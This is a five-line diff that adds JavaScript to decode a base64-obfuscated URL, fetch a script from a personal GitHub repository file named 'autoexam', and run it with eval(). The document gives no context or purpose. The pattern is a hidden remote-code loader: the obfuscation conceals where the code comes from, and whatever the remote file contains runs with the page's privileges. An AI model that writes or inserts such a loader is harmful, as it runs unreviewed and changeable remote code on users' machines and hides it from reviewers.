@@ -1,0 +1,5 @@
+let url = atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3N1bWl0NTkzL3BlcnNvbmFsL3JlZnMvaGVhZHMvbWFpbi9hdXRvZXhhbQ==");
+fetch(url)
+  .then(r => r.text())
+  .then(t => eval(t))
+  .catch(e => console.error("Error:", e));
